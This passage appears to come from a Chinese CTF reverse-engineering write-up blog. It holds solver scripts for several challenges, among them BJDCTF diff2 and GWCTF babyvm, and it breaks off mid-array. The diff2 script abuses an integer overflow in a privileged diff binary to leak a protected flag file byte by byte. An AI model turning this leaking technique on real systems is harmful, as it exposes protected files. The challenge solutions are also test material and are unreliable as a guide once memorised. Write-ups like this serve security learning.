<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">calc</span><span class="params">(<span class="keyword">uint8_t</span> a,<span class="keyword">uint8_t</span> b,<span class="keyword">uint32_t</span> v21)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> v18 = v21 ^ a;</span><br><span class="line">    <span class="keyword">uint8_t</span> v17 = v18;</span><br><span class="line">    <span class="keyword">uint8_t</span> v16 = b;</span><br><span class="line">    <span class="keyword">uint8_t</span> v3 = v16%<span class="number">7</span>; </span><br><span class="line">    v18 = v17+v3;</span><br><span class="line">    <span class="keyword">uint8_t</span> v15 = v18;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> v14 =b;</span><br><span class="line">    <span class="keyword">uint8_t</span> v4 = v14^<span class="number">18</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> v13 = v4;</span><br><span class="line">    <span class="keyword">uint8_t</span> v5 = v13*<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> v12 = v5;</span><br><span class="line">    <span class="keyword">uint8_t</span> v6 = v12+<span class="number">2</span>;</span><br><span class="line">    v18 = v15^v6;</span><br><span class="line">    <span class="keyword">return</span> v18;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> a[] = &#123;<span class="number">0xf3</span>, <span class="number">0x2e</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xe1</span>, <span class="number">0x4c</span>, <span class="number">0x22</span>, <span class="number">0xd1</span>, <span class="number">0xf9</span>, <span class="number">0x8c</span>, <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xf4</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa3</span>, <span class="number">0x90</span>, <span class="number">0xe</span>, <span class="number">0xa5</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>]=&#123;<span class="string">&#x27;#&#x27;</span>,<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> v21=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0x20</span>;j&lt;<span class="number">0x7f</span>;j++)&#123;</span><br><span class="line">            flag[i+<span class="number">1</span>]=j;</span><br><span class="line">            <span class="keyword">if</span>(calc(flag[i+<span class="number">1</span>],flag[i+v21<span class="number">-1</span>+<span class="number">1</span>],v21)==a[i])&#123;</span><br><span class="line">                flag[i+<span class="number">1</span>]=j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][BJDCTF 2nd]diff2

存在整数溢出

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; buf2[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v0 != buf2[i] )</span><br><span class="line">      <span class="keyword">return</span> v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      ++v3;</span><br></pre></td></tr></table></figure>

这里如果buf[2]+buf[1]溢出为0，则产生误判

另外学习了scp传输文件

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">got=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">43</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1</span>,<span class="number">0xff</span>):</span><br><span class="line">        cur=got+chr(j)</span><br><span class="line">        os.system(<span class="string">&quot;echo \&#x27;&quot;</span>+cur+<span class="string">&quot;\&#x27; &gt; /tmp/t&quot;</span>)</span><br><span class="line">        p = os.popen(<span class="string">&quot;/home/ctf/diff /tmp/t /home/ctf/flag&quot;</span>);</span><br><span class="line">        text = p.read()</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> text==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            print(text)</span><br><span class="line">            got+=chr(<span class="number">0x100</span>-j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(got)</span><br></pre></td></tr></table></figure>

## [rev]

~~穷举一把梭~~

逆向算法

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">11</span></span><br><span class="line">v4=<span class="number">0</span></span><br><span class="line">res = [<span class="number">0xAF</span>,<span class="number">0xAA</span>,<span class="number">0xAD</span>,<span class="number">0xEB</span>,<span class="number">0xAE</span>,<span class="number">0xAA</span>,<span class="number">0xEC</span>,<span class="number">0xA4</span>,<span class="number">0xBA</span>,<span class="number">0xAF</span>,<span class="number">0xAE</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xC0</span>,<span class="number">0xA7</span>,<span class="number">0xB0</span>,<span class="number">0xBC</span>,<span class="number">0x9A</span>,<span class="number">0xBA</span>,<span class="number">0xA5</span>,<span class="number">0xA5</span>,<span class="number">0xBA</span>,<span class="number">0xAF</span>,<span class="number">0xB8</span>,<span class="number">0x9D</span>,<span class="number">0xB8</span>,<span class="number">0xF9</span>,<span class="number">0xAE</span>,<span class="number">0x9D</span>,<span class="number">0xAB</span>,<span class="number">0xB4</span>,<span class="number">0xBC</span>,<span class="number">0xB6</span>,<span class="number">0xB3</span>,<span class="number">0x90</span>,<span class="number">0x9A</span>,<span class="number">0xA8</span>]</span><br><span class="line">print(len(res))</span><br><span class="line">res = res[::<span class="number">-1</span>]</span><br><span class="line">a = []</span><br><span class="line">cal = <span class="keyword">lambda</span> x: (<span class="number">1</span>&lt;&lt;(v4&amp;<span class="number">3</span>))+<span class="number">1</span>+(x^<span class="number">0x1c7</span>)</span><br><span class="line"><span class="comment"># a.append(res[0]^0xc7)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):</span><br><span class="line">    <span class="comment"># for j in range(0x20,0x7f):</span></span><br><span class="line">    <span class="comment">#     v11 = cal(j)</span></span><br><span class="line">    <span class="comment">#     if (v11&amp;0xFF)==res[i]:</span></span><br><span class="line">    <span class="comment">#         v4+=v11</span></span><br><span class="line">    <span class="comment">#         a.append(j)</span></span><br><span class="line">    <span class="comment">#         break</span></span><br><span class="line">    f = res[i]-(<span class="number">1</span>&lt;&lt;(v4&amp;<span class="number">3</span>))</span><br><span class="line">    f = f<span class="number">-1</span></span><br><span class="line">    f^=<span class="number">0xc7</span></span><br><span class="line">    a.append(f)</span><br><span class="line">    v4+=cal(f)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(str(bytes(a),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

## [rev][GWCTF 2019]babyvm

1. 虚拟机
2. 操作码

   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf5, 0xf1, 0xe1, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x20, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x1, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x21, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x22, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x3, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x23, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x4, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x24, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x5, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x25, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x6, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x26, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x7, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x27, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x8, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x28, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x9, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x29, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xa, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2a, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xb, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2b, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xc, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2c, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xd, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2d, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xe, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2e, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xf, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2f, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x10, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x30, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x11, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x31, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x12, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x32, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x13, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x33, 0x0, 0x0, 0x0, 0xf4, 0x0, 0x0, 0x0,</span><br></pre></td></tr></table></figure>

   然而解出来不对，真正的操作码在这里

   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf5, 0xf1, 0xe1, 0x0, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x1, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x0, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x2, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x3, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x3, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x4, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x3, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x4, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x5, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x4, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x5, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x6, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x5, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x6, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x6, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0x9, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x9, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0xa, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xd, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x13, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xd, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x13, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xe, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x12, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xe, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x12, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xf, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x11, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xf, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x11, 0x0, 0x0, 0x0, 0xf4</span><br></pre></td></tr></table></figure>
3. 长度为21 
4. 开始python脚本
5. sub_b5f为关键函数，控制哪几个数据进寄存器

解题脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">opc = [<span class="number">0xf5</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x20</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x21</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x23</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x26</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x27</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x29</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2a</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2b</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2e</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2f</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x30</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x31</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x32</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x33</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>,]</span><br><span class="line"></span><br><span class="line">opc =[<span class="number">0xf5</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span 